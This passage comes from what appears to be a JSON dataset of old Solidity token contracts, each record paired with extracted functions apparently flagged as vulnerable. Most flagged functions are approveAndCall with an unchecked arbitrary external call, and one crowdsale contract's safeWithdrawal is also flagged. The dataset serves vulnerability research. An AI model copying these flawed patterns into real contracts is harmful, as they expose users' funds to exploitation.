}\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(keccak256(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { revert(); }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1543"
  },
  "filename": "34110.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BitcoinBronze is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BitcoinBronze(\n ) {\n balances[msg.sender] = 50000000000000000000000000;\n totalSupply = 50000000000000000000000000;\n name = \"Bitcoin Bronze\";\n decimals = 18;\n symbol = \"BTCB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1544"
  },
  "filename": "34140.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 100000000000000;\n totalSupply = 100000000000000;\n name = \"Crypt0\";\n decimals = 8;\n symbol = \"CRYPT0\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1545"
  },
  "filename": "34186.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract BigDickClub is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function BigDickClub(\n ) {\n balances[msg.sender] = 10000000 * 10**18;\n totalSupply = 10000000 * 10**18;\n name = \"Big Dick Club\";\n decimals = 18;\n symbol = \"COCK\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1546"
  },
  "filename": "34202.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 42000000000000000000000000;\n totalSupply = 42000000000000000000000000;\n name = \"Zeal Token\";\n decimals = 18;\n symbol = \"ZEAL\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1547"
  },
  "filename": "34204.sol",
  "content": "pragma solidity ^0.4.16;\ncontract Token {\n uint256 public totalSupply;\n function balanceOf(address _owner) public constant returns (uint256 balance);\n function transfer(address _to, uint256 _value) public returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success);\n function approve(address _spender, uint256 _value) public returns (bool success);\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n function transfer(address _to, uint256 _value) public returns (bool success) {\n address sender = msg.sender;\n require(balances[sender] >= _value);\n balances[sender] -= _value;\n balances[_to] += _value;\n Transfer(sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n require(balances[_from] >= _value && allowed[_from][msg.sender] >= _value);\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract GigaGivingToken is StandardToken {\n using SafeMath for uint256;\n uint256 private fundingGoal = 0 ether;\n uint256 private amountRaised;\n uint256 private constant PHASE_1_PRICE = 1600000000000000;\n uint256 private constant PHASE_2_PRICE = 2000000000000000;\n uint256 private constant PHASE_3_PRICE = 2500000000000000;\n uint256 private constant PHASE_4_PRICE = 4000000000000000;\n uint256 private constant PHASE_5_PRICE = 5000000000000000;\n uint256 private constant DURATION = 5 weeks;\n uint256 public constant TOTAL_TOKENS = 15000000;\n uint256 public constant CROWDSALE_TOKENS = 12000000;\n uint256 public startTime;\n uint256 public tokenSupply;\n address public creator;\n address public beneficiary;\n string public name = \"Giga Coin\";\n string public symbol = \"GC\";\n string public version = \"GC.7\";\n uint256 public decimals = 0;\n mapping(address => uint256) public ethBalanceOf;\n bool public fundingGoalReached = false;\n bool public crowdsaleClosed = false;\n bool public refundsOpen = false;\n function GigaGivingToken (address icoBeneficiary) public {\n creator = msg.sender;\n beneficiary = icoBeneficiary;\n totalSupply = TOTAL_TOKENS;\n balances[beneficiary] = TOTAL_TOKENS.sub(CROWDSALE_TOKENS);\n Transfer(0x0, icoBeneficiary, TOTAL_TOKENS.sub(CROWDSALE_TOKENS));\n balances[this] = CROWDSALE_TOKENS;\n Transfer(0x0, this, CROWDSALE_TOKENS);\n tokenSupply = CROWDSALE_TOKENS;\n startTime = 1510765200;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function () public payable {\n require(now >= startTime);\n require(now <= startTime + DURATION);\n require(!crowdsaleClosed);\n require(msg.value > 0);\n uint256 amount = msg.value;\n uint256 coinTotal = 0;\n if (now > startTime + 4 weeks) {\n coinTotal = amount.div(PHASE_5_PRICE);\n } else if (now > startTime + 3 weeks) {\n coinTotal = amount.div(PHASE_4_PRICE);\n } else if (now > startTime + 2 weeks) {\n coinTotal = amount.div(PHASE_3_PRICE);\n } else if (now > startTime + 1 weeks) {\n coinTotal = amount.div(PHASE_2_PRICE);\n } else {\n coinTotal = amount.div(PHASE_1_PRICE);\n }\n ethBalanceOf[msg.sender] = ethBalanceOf[msg.sender].add(amount);\n balances[msg.sender] = balances[msg.sender].add(coinTotal);\n balances[this] = balances[this].sub(coinTotal);\n amountRaised = amountRaised.add(amount);\n tokenSupply = tokenSupply.sub(coinTotal);\n transfer(msg.sender, coinTotal);\n }\n modifier afterDeadline() {\n if (now >= (startTime + DURATION)) {\n _;\n }\n }\n function checkGoalReached() public afterDeadline {\n if (amountRaised >= fundingGoal) {\n fundingGoalReached = true;\n }\n crowdsaleClosed = true;\n }\n function safeWithdrawal() public afterDeadline {\n if (refundsOpen) {\n uint amount = ethBalanceOf[msg.sender];\n ethBalanceOf[msg.sender] = 0;\n if (amount > 0) {\n if (!msg.sender.send(amount)) {\n ethBalanceOf[msg.sender] = amount;\n }\n }\n }\n if (fundingGoalReached && beneficiary == msg.sender) {\n if (beneficiary.send(amountRaised)) {\n this.transfer(msg.sender, tokenSupply);\n } else {\n fundingGoalReached = false;\n }\n }\n }\n function enableRefunds() public afterDeadline {\n require(msg.sender == beneficiary);\n refundsOpen = true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}",
    "function safeWithdrawal() public afterDeadline {\nif (refundsOpen) {\nuint amount = ethBalanceOf[msg.sender];\nethBalanceOf[msg.sender] = 0;\nif (amount > 0) {\nif (!msg.sender.send(amount)) {\nethBalanceOf[msg.sender] = amount;\n}\n}\n}\nif (fundingGoalReached && beneficiary == msg.sender) {\nif (beneficiary.send(amountRaised)) {\nthis.transfer(msg.sender, tokenSupply);\n} else {\nfundingGoalReached = false;\n}\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1548"
  },
  "filename": "34222.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract SISIPI is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function SISIPI(\n ) {\n balances[msg.sender] = 1000000000000000;\n totalSupply = 1000000000000000;\n name = \"SISIPI\";\n decimals = 8;\n symbol = \"SISI\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1549"
  },
  "filename": "34225.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract STRADDLE is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function STRADDLE(\n ) {\n balances[msg.sender] = 180000000;\n totalSupply = 180000000;\n name = \"Straddle.Fund\";\n decimals = 1;\n symbol = \"STF\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb154a"
  },
  "filename": "34266.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 10000;\n totalSupply = 10000;\n name = \"FC BARCELONA TOKEN\";\n decimals = 0;\n symbol = \"FCB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb154b"
  },
  "filename": "34271.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 14000000000000000000000000;\n totalSupply = 14000000000000000000000000;\n name = \"Ethereum Prime\";\n decimals = 18;\n symbol = \"EPRIME\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb154c"
  },
  "filename": "34282.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EthereumChina is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EthereumChina(\n ) {\n balances[msg.sender] = 30000000;\n totalSupply = 30000000;\n name = \"Ethereum China\";\n decimals = 0;\n symbol = \"ETHC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
